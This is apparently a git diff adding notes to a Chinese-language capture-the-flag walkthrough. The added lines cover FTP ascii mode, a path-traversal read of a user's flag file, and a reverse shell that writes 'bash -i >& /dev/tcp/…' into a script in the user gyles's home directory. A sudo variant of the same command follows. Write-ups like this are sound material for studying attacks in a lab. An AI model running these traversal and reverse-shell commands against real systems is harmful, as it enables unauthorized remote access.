@@ -102,6 +102,20 @@ read -sp "Enter Username Password: " T3@m$h@r3
 ```
 登陆ftp试试：
 
+ftp登录的时候看着点，有一句话：Remote system type is UNIX.Using binary mode to transfer files.
+需要转换为ascii模式：
+```
+ftp>ascii
+```
+才能使用命令。
+有个文件:
+Dale
+        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
+found at ".dev" within our domain.
+
+Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.
+
+Gyles
 
 
 VHOST扫描：
@@ -149,6 +163,16 @@ sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
 ```
 可以看到使用/bin/bash的两个低权限用户gyles和dale
 
+使用同样的方法读出user.txt:
+```
+../../../../home/dale/user.txt
+```
+但是root.txt不能直接读出来，还是要想办法拿到反shell
 
 
 
+echo "bash -i >& /dev/tcp/10.17.6.249/1234 0>&1" > /home/gyles/admin_checks
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+sudo sh -c 'echo "bash -i >& /dev/tcp/10.17.6.249/1234 0>&1" > /home/gyles/admin_checks'
